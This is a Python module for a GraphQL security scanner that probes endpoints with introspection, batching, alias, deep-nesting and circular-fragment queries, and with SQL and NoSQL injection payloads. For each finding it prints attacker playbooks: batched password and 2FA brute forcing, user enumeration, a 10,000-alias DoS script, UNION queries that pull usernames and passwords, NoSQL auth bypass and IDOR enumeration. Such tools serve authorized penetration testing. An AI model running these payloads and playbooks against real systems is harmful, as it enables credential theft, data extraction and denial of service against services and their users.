"""
GraphQL Comprehensive Security Scanner

Covers all major GraphQL vulnerabilities:
- Introspection enabled (information disclosure)
- Batch Query attacks (rate limit bypass, DoS)
- Alias-based DoS
- Deeply nested queries (DoS)
- Circular fragment attacks
- Field duplication DoS
- SQL/NoSQL injection via variables
- IDOR (Insecure Direct Object Reference)
- Authorization bypass
- Directive overloading

Based on:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
- https://portswigger.net/web-security/graphql
- https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
"""

from core.base_module import BaseModule
from core.logger import get_logger
from typing import List, Dict, Any, Optional, Set
import json
import re
import time
from urllib.parse import urljoin, urlparse

logger = get_logger(__name__)


class GraphQLSecurityScanner(BaseModule):
    """Comprehensive GraphQL Security Scanner"""

    # Common GraphQL endpoint paths
    GRAPHQL_PATHS = [
        '/graphql',
        '/graphiql',
        '/api/graphql',
        '/api/graphiql',
        '/v1/graphql',
        '/v2/graphql',
        '/query',
        '/gql',
        '/api/gql',
        '/graphql/console',
        '/graphql/api',
        '/playground',
        '/altair',
        '/explorer',
        '/api',
        '/api/query',
        '/__graphql',
        '/graphql.php',
        '/index.php?graphql',
    ]

    # Full introspection query
    INTROSPECTION_QUERY = '''
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type {
        ...TypeRef
      }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
          }
        }
      }
    }
    '''

    # SQL Injection test payloads for GraphQL variables
    SQLI_PAYLOADS = [
        "' OR '1'='1",
        "' OR 1=1--",
        "\" OR \"1\"=\"1",
        "1' AND SLEEP(5)--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT username,password FROM users--",
        "admin'--",
        "1; DROP TABLE users--",
    ]

    # NoSQL Injection payloads
    NOSQLI_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "sleep(5000)"}',
        '{"$or": [{}]}',
        "true, $where: '1 == 1'",
        "'; return '' == '",
    ]

    def __init__(self, module_path: str, payload_limit: int = None):
        """Initialize GraphQL Scanner"""
        super().__init__(module_path, payload_limit=payload_limit)
        self.discovered_endpoints: Set[str] = set()
        self.schema_cache: Dict[str, Any] = {}
        self.marker = f"GQL{int(time.time()) % 100000}"
        logger.info(f"GraphQL Scanner loaded with marker: {self.marker}")

    def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        """
        Comprehensive GraphQL security scan

        Args:
            targets: List of targets to scan
            http_client: HTTP client

        Returns:
            List of vulnerability findings
        """
        results = []
        scanned_hosts = set()

        logger.info(f"Starting GraphQL security scan on {len(targets)} targets")

        for target in targets:
            url = target.get('url', '')
            if not url:
                continue

            parsed = urlparse(url)
            host_key = f"{parsed.scheme}://{parsed.netloc}"

            # Only discover endpoints once per host
            if host_key not in scanned_hosts:
                scanned_hosts.add(host_key)
                endpoints = self._discover_graphql_endpoints(url, http_client)
                self.discovered_endpoints.update(endpoints)

            # Test each discovered endpoint
            for endpoint in self.discovered_endpoints:
                if host_key not in endpoint:
                    continue

                # Run all submodule tests
                results.extend(self._test_introspection(endpoint, http_client))
                results.extend(self._test_batch_attacks(endpoint, http_client))
                results.extend(self._test_alias_dos(endpoint, http_client))
                results.extend(self._test_depth_attack(endpoint, http_client))
                results.extend(self._test_field_duplication(endpoint, http_client))
                results.extend(self._test_circular_fragments(endpoint, http_client))
                results.extend(self._test_sql_injection(endpoint, http_client))
                results.extend(self._test_nosql_injection(endpoint, http_client))
                results.extend(self._test_idor(endpoint, http_client))
                results.extend(self._test_directive_overload(endpoint, http_client))
                results.extend(self._test_field_suggestions(endpoint, http_client))

        logger.info(f"GraphQL scan complete: {len(results)} vulnerabilities found")
        return results

    def _discover_graphql_endpoints(self, base_url: str, http_client: Any) -> List[str]:
        """Discover GraphQL endpoints on the target"""
        endpoints = []
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in self.GRAPHQL_PATHS:
            test_url = urljoin(base, path)

            try:
                # Try basic query to detect GraphQL
                test_query = {'query': '{__typename}'}
                response = http_client.post(
                    test_url,
                    json=test_query,
                    headers={'Content-Type': 'application/json'}
                )

                if response and response.status_code in [200, 400, 401, 403, 500]:
                    try:
                        data = response.json()
                        if 'data' in data or 'errors' in data:
                            endpoints.append(test_url)
                            logger.info(f"Discovered GraphQL endpoint: {test_url}")
                    except:
                        pass
            except:
                pass

        # If no endpoints found, test the base URL
        if not endpoints:
            try:
                test_query = {'query': '{__typename}'}
                response = http_client.post(
                    base_url,
                    json=test_query,
                    headers={'Content-Type': 'application/json'}
                )
                if response:
                    try:
                        data = response.json()
                        if 'data' in data or 'errors' in data:
                            endpoints.append(base_url)
                    except:
                        pass
            except:
                pass

        return endpoints

    def _send_graphql(self, url: str, query: str, http_client: Any,
                      variables: Dict = None, operation_name: str = None) -> Optional[Any]:
        """Send a GraphQL request"""
        try:
            payload = {'query': query}
            if variables:
                payload['variables'] = variables
            if operation_name:
                payload['operationName'] = operation_name

            response = http_client.post(
                url,
                json=payload,
                headers={'Content-Type': 'application/json'}
            )
            return response
        except Exception as e:
            logger.debug(f"GraphQL request error: {e}")
            return None

    # ============= SUBMODULE: Introspection =============
    def _test_introspection(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for introspection enabled"""
        results = []

        response = self._send_graphql(url, self.INTROSPECTION_QUERY, http_client)
        if not response:
            return results

        try:
            data = response.json()
            if 'data' in data and data['data'] and '__schema' in data['data']:
                schema = data['data']['__schema']
                types_count = len(schema.get('types', []))
                query_type = schema.get('queryType', {}).get('name', 'Unknown')
                mutation_type = schema.get('mutationType', {}).get('name', 'None')

                # Cache schema for other tests
                self.schema_cache[url] = schema

                # Extract sensitive-looking types
                sensitive_types = []
                for t in schema.get('types', []):
                    name = t.get('name', '').lower()
                    if any(keyword in name for keyword in ['user', 'admin', 'password', 'secret', 'token', 'auth', 'credential', 'private']):
                        sensitive_types.append(t.get('name'))

                exploitation_steps = self._generate_introspection_steps(url, schema, sensitive_types)

                result = self.create_result(
                    vulnerable=True,
                    url=url,
                    parameter='Introspection Query',
                    payload='query { __schema { types { name } } }',
                    evidence=f"Schema exposed: {types_count} types, Query: {query_type}, Mutation: {mutation_type}. "
                             f"Sensitive types found: {', '.join(sensitive_types[:5])}{'...' if len(sensitive_types) > 5 else ''}",
                    description="GraphQL Introspection is enabled, exposing the entire API schema",
                    confidence=0.95,
                    exploitation_steps=exploitation_steps
                )
                result['severity'] = 'medium'
                result['cwe'] = 'CWE-200'
                result['submodule'] = 'introspection'
                result['schema_types'] = types_count
                result['sensitive_types'] = sensitive_types[:10]
                results.append(result)

        except Exception as e:
            logger.debug(f"Introspection test error: {e}")

        return results

    def _generate_introspection_steps(self, url: str, schema: Dict, sensitive_types: List[str]) -> List[str]:
        """Generate exploitation steps for introspection"""
        steps = [
            "=== GraphQL Introspection Exploitation ===",
            f"Target: {url}",
            "",
            "STEP 1: Dump Full Schema",
            "Use GraphQL Voyager or InQL to visualize the schema:",
            "  https://graphql-kit.com/graphql-voyager/",
            "",
            "Or use curl:",
            f'curl -X POST {url} \\',
            '  -H "Content-Type: application/json" \\',
            '  -d \'{"query": "{__schema{types{name,fields{name,args{name,type{name}}}}}}\'}\'',
            "",
            "STEP 2: Enumerate Queries",
            '{"query": "{__schema{queryType{fields{name description args{name type{name}}}}}}"}',
            "",
            "STEP 3: Enumerate Mutations (may allow data modification)",
            '{"query": "{__schema{mutationType{fields{name description args{name type{name}}}}}}"}',
            "",
        ]

        if sensitive_types:
            steps.append("STEP 4: Explore Sensitive Types Found:")
            for t in sensitive_types[:5]:
                steps.append(f'  {{"query": "{{__type(name:\\"{t}\\"){{fields{{name type{{name}}}}}}}}"}}')

        steps.extend([
            "",
            "STEP 5: Use GraphQL IDE Tools",
            "- GraphQL Playground: https://github.com/graphql/graphql-playground",
            "- Altair: https://altairgraphql.dev/",
            "- InQL Burp Extension: https://github.com/doyensec/inql",
            "",
            "STEP 6: Look for Auth Bypass",
            "Try accessing admin mutations without authentication:",
            '{"query": "mutation { deleteUser(id: 1) { success } }"}',
        ])

        return steps

    # ============= SUBMODULE: Batch Attacks =============
    def _test_batch_attacks(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for batch query attacks (rate limit bypass, brute force)"""
        results = []

        # Build batch query with multiple operations
        batch_count = self.config.get('batch_query_limit', 100)

        # Test array-style batching
        batch_queries = []
        for i in range(batch_count):
            batch_queries.append({'query': f'{{ __typename }}'})

        try:
            response = http_client.post(
                url,
                json=batch_queries,
                headers={'Content-Type': 'application/json'}
            )

            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if isinstance(data, list) and len(data) > 1:
                        exploitation_steps = self._generate_batch_steps(url, batch_count)

                        result = self.create_result(
                            vulnerable=True,
                            url=url,
                            parameter='Batch Query',
                            payload=f'[{{"query": "..."}} x {batch_count}]',
                            evidence=f"Server accepted batch of {batch_count} queries, returned {len(data)} results",
                            description="GraphQL allows batch queries - can be used for rate limit bypass and brute force attacks",
                            confidence=0.90,
                            exploitation_steps=exploitation_steps
                        )
                        result['severity'] = 'medium'
                        result['cwe'] = 'CWE-770'
                        result['submodule'] = 'batch_dos'
                        results.append(result)
                except:
                    pass
        except Exception as e:
            logger.debug(f"Batch test error: {e}")

        return results

    def _generate_batch_steps(self, url: str, batch_count: int) -> List[str]:
        """Generate batch attack exploitation steps"""
        return [
            "=== GraphQL Batch Query Attack ===",
            f"Target: {url}",
            "",
            "STEP 1: Brute Force Password with Single Request",
            "This bypasses rate limiting by sending multiple attempts in one HTTP request:",
            "",
            "```json",
            "[",
            '  {"query": "mutation { login(user:\\"admin\\", pass:\\"password1\\") { token }}"},',
            '  {"query": "mutation { login(user:\\"admin\\", pass:\\"password2\\") { token }}"},',
            '  {"query": "mutation { login(user:\\"admin\\", pass:\\"password3\\") { token }}"},',
            '  ... (repeat for entire wordlist)',
            "]",
            "```",
            "",
            "STEP 2: OTP/2FA Brute Force",
            "```json",
            "[",
            '  {"query": "mutation { verify2FA(code:\\"000001\\") { success }}"},',
            '  {"query": "mutation { verify2FA(code:\\"000002\\") { success }}"},',
            '  ... (all 6-digit codes in one request)',
            "]",
            "```",
            "",
            "STEP 3: DoS via Resource Exhaustion",
            f"Send {batch_count}+ expensive queries in single request to exhaust server resources",
            "",
            "STEP 4: User Enumeration",
            "```json",
            "[",
            '  {"query": "{ user(email:\\"user1@example.com\\") { id }}"},',
            '  {"query": "{ user(email:\\"user2@example.com\\") { id }}"},',
            '  ... (check thousands of emails at once)',
            "]",
            "```",
        ]

    # ============= SUBMODULE: Alias DoS =============
    def _test_alias_dos(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for alias-based DoS attacks"""
        results = []

        # Build query with many aliases
        alias_count = 100
        aliases = ' '.join([f'a{i}:__typename' for i in range(alias_count)])
        query = f'{{ {aliases} }}'

        response = self._send_graphql(url, query, http_client)
        if not response:
            return results

        try:
            data = response.json()
            if 'data' in data and data['data']:
                returned_aliases = len(data['data'])
                if returned_aliases >= alias_count // 2:
                    exploitation_steps = self._generate_alias_dos_steps(url)

                    result = self.create_result(
                        vulnerable=True,
                        url=url,
                        parameter='Query Aliases',
                        payload=f'{{ a0:field a1:field ... a{alias_count}:field }}',
                        evidence=f"Server processed {returned_aliases} aliases in single query",
                        description="GraphQL allows unlimited aliases - can multiply resource consumption",
                        confidence=0.85,
                        exploitation_steps=exploitation_steps
                    )
                    result['severity'] = 'medium'
                    result['cwe'] = 'CWE-400'
                    result['submodule'] = 'alias_dos'
                    results.append(result)

        except Exception as e:
            logger.debug(f"Alias DoS test error: {e}")

        return results

    def _generate_alias_dos_steps(self, url: str) -> List[str]:
        """Generate alias DoS exploitation steps"""
        return [
            "=== GraphQL Alias-based DoS Attack ===",
            f"Target: {url}",
            "",
            "STEP 1: Multiply Expensive Operations",
            "If there's a slow query (e.g., search), multiply it with aliases:",
            "",
            "```graphql",
            "query DoS {",
            '  a1: searchUsers(query: "admin") { id email }',
            '  a2: searchUsers(query: "admin") { id email }',
            '  a3: searchUsers(query: "admin") { id email }',
            "  # ... repeat 1000+ times",
            "}",
            "```",
            "",
            "STEP 2: Database Query Amplification",
            "```graphql",
            "{",
            "  a1: allUsers { posts { comments { author { posts { comments }}}}}",
            "  a2: allUsers { posts { comments { author { posts { comments }}}}}",
            "  # Each alias triggers same expensive DB query",
            "}",
            "```",
            "",
            "STEP 3: Automated DoS Script",
            "```python",
            "import requests",
            f"url = '{url}'",
            "aliases = ' '.join([f'a{{i}}:expensiveQuery' for i in range(10000)])",
            "query = f'{{ {aliases} }}'",
            "requests.post(url, json={'query': query})",
            "```",
        ]

    # ============= SUBMODULE: Depth Attack =============
    def _test_depth_attack(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for deeply nested query DoS"""
        results = []

        max_depth = self.config.get('max_depth', 20)

        # Build deeply nested query
        # Using __typename which exists on all types
        nested_query = '__typename'
        for i in range(max_depth):
            nested_query = f'__type(name: "Query") {{ name fields {{ name type {{ {nested_query} }} }} }}'

        query = f'{{ {nested_query} }}'

        start_time = time.time()
        response = self._send_graphql(url, query, http_client)
        response_time = time.time() - start_time

        if not response:
            return results

        try:
            data = response.json()
            # Check if deeply nested query was processed
            if 'data' in data or ('errors' not in data):
                # Server processed the deep query
                if response_time > 2.0:  # Took a while
                    exploitation_steps = self._generate_depth_dos_steps(url, max_depth)

                    result = self.create_result(
                        vulnerable=True,
                        url=url,
                        parameter='Query Depth',
                        payload=f'Nested query depth: {max_depth}',
                        evidence=f"Server processed {max_depth}-level nested query in {response_time:.2f}s",
                        description="GraphQL allows deeply nested queries - can cause exponential resource consumption",
                        confidence=0.80,
                        exploitation_steps=exploitation_steps
                    )
                    result['severity'] = 'high'
                    result['cwe'] = 'CWE-400'
                    result['submodule'] = 'depth_attack'
                    result['response_time'] = response_time
                    results.append(result)

        except Exception as e:
            logger.debug(f"Depth attack test error: {e}")

        return results

    def _generate_depth_dos_steps(self, url: str, depth: int) -> List[str]:
        """Generate depth attack exploitation steps"""
        return [
            "=== GraphQL Depth-based DoS Attack ===",
            f"Target: {url}",
            "",
            "STEP 1: Identify Recursive Types",
            "Look for types that reference themselves (e.g., User -> friends -> User)",
            "",
            "STEP 2: Build Exponentially Expensive Query",
            "```graphql",
            "query DepthBomb {",
            "  users {",
            "    friends {",
            "      friends {",
            "        friends {",
            "          friends {",
            "            # Continue nesting...",
            f"            # Tested depth: {depth}",
            "          }",
            "        }",
            "      }",
            "    }",
            "  }",
            "}",
            "```",
            "",
            "STEP 3: Calculate Complexity",
            "With 100 users each having 100 friends:",
            "Depth 1: 100 queries",
            "Depth 2: 10,000 queries",
            "Depth 3: 1,000,000 queries",
            "Depth 4: 100,000,000 queries (CRASH)",
            "",
            "STEP 4: Combine with Aliases",
            "```graphql",
            "{ a1: users { friends { friends { friends }}}",
            "  a2: users { friends { friends { friends }}}",
            "  # Multiply the exponential query",
            "}",
            "```",
        ]

    # ============= SUBMODULE: Field Duplication =============
    def _test_field_duplication(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for field duplication DoS"""
        results = []

        # Duplicate __typename field many times
        field_count = 1000
        fields = ' '.join(['__typename'] * field_count)
        query = f'{{ {fields} }}'

        start_time = time.time()
        response = self._send_graphql(url, query, http_client)
        response_time = time.time() - start_time

        if not response:
            return results

        try:
            if response.status_code == 200 and response_time > 1.0:
                result = self.create_result(
                    vulnerable=True,
                    url=url,
                    parameter='Field Duplication',
                    payload=f'{{ __typename x {field_count} }}',
                    evidence=f"Server processed {field_count} duplicate fields in {response_time:.2f}s",
                    description="GraphQL allows field duplication - can be used for DoS",
                    confidence=0.75,
                    exploitation_steps=[
                        "=== Field Duplication DoS ===",
                        f"Target: {url}",
                        "",
                        "STEP 1: Duplicate expensive fields",
                        "```graphql",
                        "{ " + " ".join(["expensiveField"] * 10) + " }",
                        "```",
                        "",
                        "STEP 2: Combine with expensive resolvers",
                        "Find fields that trigger heavy computation and duplicate them",
                    ]
                )
                result['severity'] = 'low'
                result['cwe'] = 'CWE-400'
                result['submodule'] = 'field_duplication'
                results.append(result)

        except Exception as e:
            logger.debug(f"Field duplication test error: {e}")

        return results

    # ============= SUBMODULE: Circular Fragments =============
    def _test_circular_fragments(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for circular fragment reference attacks"""
        results = []

        # Build circular fragment reference
        query = '''
        query CircularFragment {
          __typename
          ...A
        }
        fragment A on Query { __typename ...B }
        fragment B on Query { __typename ...A }
        '''

        response = self._send_graphql(url, query, http_client)
        if not response:
            return results

        try:
            data = response.json()
            # Check if server crashed or hung
            if 'errors' in data:
                for error in data.get('errors', []):
                    msg = str(error.get('message', '')).lower()
                    if 'circular' in msg or 'cycle' in msg or 'infinite' in msg:
                        # Server detected the attack - good defense
                        return results

            # If server processed it without error - vulnerable
            if 'data' in data:
                result = self.create_result(
                    vulnerable=True,
                    url=url,
                    parameter='Fragment References',
                    payload='fragment A { ...B } fragment B { ...A }',
                    evidence="Server accepted circular fragment references",
                    description="GraphQL allows circular fragments - can cause infinite loops",
                    confidence=0.70,
                    exploitation_steps=[
                        "=== Circular Fragment Attack ===",
                        f"Target: {url}",
                        "",
                        "STEP 1: Create Circular Reference",
                        "```graphql",
                        "fragment A on Query { ...B }",
                        "fragment B on Query { ...A }",
                        "query { ...A }",
                        "```",
                        "",
                        "STEP 2: Multiple Circular Chains",
                        "Create several circular fragment chains for amplification",
                    ]
                )
                result['severity'] = 'medium'
                result['cwe'] = 'CWE-835'
                result['submodule'] = 'circular_fragments'
                results.append(result)

        except Exception as e:
            logger.debug(f"Circular fragment test error: {e}")

        return results

    # ============= SUBMODULE: SQL Injection =============
    def _test_sql_injection(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for SQL injection via GraphQL variables"""
        results = []

        # Test queries that commonly accept user input
        test_queries = [
            ('query($id: String!) { user(id: $id) { id email }}', 'id'),
            ('query($search: String!) { users(search: $search) { id }}', 'search'),
            ('query($filter: String!) { items(filter: $filter) { id }}', 'filter'),
            ('query($name: String!) { findUser(name: $name) { id }}', 'name'),
        ]

        for query, param in test_queries:
            for sqli_payload in self.SQLI_PAYLOADS[:5]:  # Limit payloads
                variables = {param: sqli_payload}

                start_time = time.time()
                response = self._send_graphql(url, query, http_client, variables=variables)
                response_time = time.time() - start_time

                if not response:
                    continue

                try:
                    data = response.json()
                    resp_text = json.dumps(data).lower()

                    # Check for SQL injection indicators
                    sqli_indicators = [
                        'sql', 'syntax', 'mysql', 'postgresql', 'sqlite',
                        'oracle', 'mssql', 'database', 'query failed',
                        'unclosed quotation', 'you have an error'
                    ]

                    for indicator in sqli_indicators:
                        if indicator in resp_text:
                            exploitation_steps = self._generate_sqli_steps(url, query, param)

                            result = self.create_result(
                                vulnerable=True,
                                url=url,
                                parameter=f'GraphQL variable: ${param}',
                                payload=sqli_payload,
                                evidence=f"SQL error indicator found: '{indicator}'",
                                description="SQL Injection vulnerability in GraphQL query variable",
                                confidence=0.85,
                                exploitation_steps=exploitation_steps
                            )
                            result['severity'] = 'critical'
                            result['cwe'] = 'CWE-89'
                            result['submodule'] = 'sql_injection'
                            results.append(result)
                            break

                    # Time-based detection
                    if 'SLEEP' in sqli_payload and response_time > 4.5:
                        result = self.create_result(
                            vulnerable=True,
                            url=url,
                            parameter=f'GraphQL variable: ${param}',
                            payload=sqli_payload,
                            evidence=f"Time-based SQLi detected: {response_time:.2f}s delay",
                            description="Blind SQL Injection via GraphQL variable (time-based)",
                            confidence=0.90,
                            exploitation_steps=self._generate_sqli_steps(url, query, param)
                        )
                        result['severity'] = 'critical'
                        result['cwe'] = 'CWE-89'
                        result['submodule'] = 'sql_injection'
                        results.append(result)

                except Exception as e:
                    logger.debug(f"SQLi test error: {e}")

                # Found SQLi - don't need to test more payloads
                if results:
                    break

        return results

    def _generate_sqli_steps(self, url: str, query: str, param: str) -> List[str]:
        """Generate SQL injection exploitation steps"""
        return [
            "=== GraphQL SQL Injection Exploitation ===",
            f"Target: {url}",
            f"Vulnerable Parameter: ${param}",
            "",
            "STEP 1: Confirm Injection",
            "```json",
            "{",
            f'  "query": "{query}",',
            f'  "variables": {{"{param}": "\' OR \'1\'=\'1"}}',
            "}",
            "```",
            "",
            "STEP 2: Extract Database Version",
            f'"variables": {{"{param}": "\' UNION SELECT version()--"}}',
            "",
            "STEP 3: Enumerate Tables",
            f'"variables": {{"{param}": "\' UNION SELECT table_name FROM information_schema.tables--"}}',
            "",
            "STEP 4: Extract Sensitive Data",
            f'"variables": {{"{param}": "\' UNION SELECT username,password FROM users--"}}',
            "",
            "STEP 5: Use SQLMap",
            f"Save the request to a file and use:",
            "sqlmap -r request.txt --level=5 --risk=3",
            "",
            "STEP 6: For Blind SQLi",
            f'"variables": {{"{param}": "\' AND SLEEP(5)--"}}',
            f'"variables": {{"{param}": "\' AND (SELECT * FROM users WHERE username=\'admin\' AND SUBSTRING(password,1,1)=\'a\')--"}}',
        ]

    # ============= SUBMODULE: NoSQL Injection =============
    def _test_nosql_injection(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for NoSQL injection via GraphQL"""
        results = []

        test_queries = [
            ('query($id: String!) { user(id: $id) { id }}', 'id'),
            ('query($filter: String!) { items(filter: $filter) { id }}', 'filter'),
        ]

        for query, param in test_queries:
            for nosqli_payload in self.NOSQLI_PAYLOADS[:3]:
                try:
                    # Try to send the payload as JSON if it looks like JSON
                    if nosqli_payload.startswith('{'):
                        try:
                            variables = {param: json.loads(nosqli_payload)}
                        except:
                            variables = {param: nosqli_payload}
                    else:
                        variables = {param: nosqli_payload}

                    response = self._send_graphql(url, query, http_client, variables=variables)

                    if response:
                        data = response.json()
                        resp_text = json.dumps(data).lower()

                        # Check for NoSQL indicators
                        nosql_indicators = ['mongodb', 'mongoose', 'nosql', 'bson', '$where', 'operator']

                        for indicator in nosql_indicators:
                            if indicator in resp_text:
                                result = self.create_result(
                                    vulnerable=True,
                                    url=url,
                                    parameter=f'GraphQL variable: ${param}',
                                    payload=nosqli_payload,
                                    evidence=f"NoSQL error indicator: '{indicator}'",
                                    description="NoSQL Injection vulnerability in GraphQL",
                                    confidence=0.80,
                                    exploitation_steps=[
                                        "=== GraphQL NoSQL Injection ===",
                                        f"Target: {url}",
                                        "",
                                        "STEP 1: Auth Bypass",
                                        '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                                        "",
                                        "STEP 2: Extract All Data",
                                        '{"$where": "return true"}',
                                        "",
                                        "STEP 3: Regex-based Extraction",
                                        '{"password": {"$regex": "^a.*"}}',
                                    ]
                                )
                                result['severity'] = 'critical'
                                result['cwe'] = 'CWE-943'
                                result['submodule'] = 'nosql_injection'
                                results.append(result)
                                return results

                except Exception as e:
                    logger.debug(f"NoSQLi test error: {e}")

        return results

    # ============= SUBMODULE: IDOR =============
    def _test_idor(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for IDOR via GraphQL"""
        results = []

        # Test sequential ID access
        idor_queries = [
            'query { user(id: 1) { id email role }}',
            'query { user(id: "1") { id email role }}',
            'query { order(id: 1) { id total userId }}',
            'query { document(id: 1) { id content ownerId }}',
        ]

        for query in idor_queries:
            response = self._send_graphql(url, query, http_client)

            if response and response.status_code == 200:
                try:
                    data = response.json()
                    if 'data' in data and data['data']:
                        # Check if we got actual data (possible IDOR)
                        result_data = data['data']
                        data_str = json.dumps(result_data).lower()

                        # Check for sensitive data exposure
                        sensitive_fields = ['email', 'password', 'phone', 'address', 'ssn', 'credit', 'token', 'secret']
                        exposed_fields = [f for f in sensitive_fields if f in data_str]

                        if exposed_fields:
                            result = self.create_result(
                                vulnerable=True,
                                url=url,
                                parameter='Object ID',
                                payload=query,
                                evidence=f"Accessed data with ID=1, exposed fields: {', '.join(exposed_fields)}",
                                description="Potential IDOR - can access other users' data via ID enumeration",
                                confidence=0.70,
                                exploitation_steps=[
                                    "=== GraphQL IDOR Exploitation ===",
                                    f"Target: {url}",
                                    "",
                                    "STEP 1: Enumerate IDs",
                                    "for id in range(1, 1000):",
                                    f'    query {{ user(id: {{id}}) {{ id email role }} }}',
                                    "",
                                    "STEP 2: Access Admin Data",
                                    '{ user(id: 1) { email password adminToken }}',
                                    "",
                                    "STEP 3: Enumerate via Mutations",
                                    'mutation { updateUser(id: 1, data: {...}) { success }}',
                                    "",
                                    "STEP 4: Batch IDOR via Aliases",
                                    '{ u1: user(id: 1) {...} u2: user(id: 2) {...} ... }',
                                ]
                            )
                            result['severity'] = 'high'
                            result['cwe'] = 'CWE-639'
                            result['submodule'] = 'idor'
                            results.append(result)
                            break

                except Exception as e:
                    logger.debug(f"IDOR test error: {e}")

        return results

    # ============= SUBMODULE: Directive Overload =============
    def _test_directive_overload(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for directive overloading attacks"""
        results = []

        # Build query with many directives
        directive_count = 100
        directives = ' '.join(['@include(if: true)'] * directive_count)
        query = f'{{ __typename {directives} }}'

        response = self._send_graphql(url, query, http_client)

        if response and response.status_code == 200:
            try:
                data = response.json()
                if 'data' in data:
                    result = self.create_result(
                        vulnerable=True,
                        url=url,
                        parameter='Directives',
                        payload=f'{{ field @include(if:true) x {directive_count} }}',
                        evidence=f"Server processed {directive_count} directives",
                        description="GraphQL allows directive overloading - potential DoS",
                        confidence=0.65,
                        exploitation_steps=[
                            "=== Directive Overload Attack ===",
                            f"Target: {url}",
                            "",
                            "STEP 1: Multiply Directives",
                            '{ field @include(if:true) @include(if:true) @include(if:true)... }',
                            "",
                            "STEP 2: Custom Directives",
                            "Look for custom directives that may have expensive operations",
                        ]
                    )
                    result['severity'] = 'low'
                    result['cwe'] = 'CWE-400'
                    result['submodule'] = 'directive_overload'
                    results.append(result)

            except Exception as e:
                logger.debug(f"Directive overload test error: {e}")

        return results

    # ============= SUBMODULE: Field Suggestions =============
    def _test_field_suggestions(self, url: str, http_client: Any) -> List[Dict[str, Any]]:
        """Test for field suggestion information disclosure"""
        results = []

        # Send query with typo to get field suggestions
        query = '{ usrs { id } }'  # Intentional typo

        response = self._send_graphql(url, query, http_client)
        if not response:
            return results

        try:
            data = response.json()
            if 'errors' in data:
                for error in data.get('errors', []):
                    msg = str(error.get('message', ''))
                    if 'Did you mean' in msg or 'suggest' in msg.lower():
                        result = self.create_result(
                            vulnerable=True,
                            url=url,
                            parameter='Field Names',
                            payload='{ usrs { id } }',
                            evidence=f"Server suggests fields: {msg[:200]}",
                            description="GraphQL exposes field names via suggestions - information disclosure",
                            confidence=0.80,
                            exploitation_steps=[
                                "=== Field Suggestion Enumeration ===",
                                f"Target: {url}",
                                "",
                                "STEP 1: Enumerate Fields",
                                "Send queries with common field name typos:",
                                '{ usrs { id } }  → Did you mean "users"?',
                                '{ passw { id } } → Did you mean "password"?',
                                "",
                                "STEP 2: Automate Enumeration",
                                "Use wordlist and collect all suggestions",
                                "",
                                "STEP 3: Build Schema Map",
                                "Reconstruct schema from suggestions",
                            ]
                        )
                        result['severity'] = 'low'
                        result['cwe'] = 'CWE-200'
                        result['submodule'] = 'field_suggestions'
                        results.append(result)
                        break

        except Exception as e:
            logger.debug(f"Field suggestion test error: {e}")

        return results


def get_module(module_path: str, payload_limit: int = None):
    """Factory function to create module instance"""
    return GraphQLSecurityScanner(module_path, payload_limit=payload_limit)
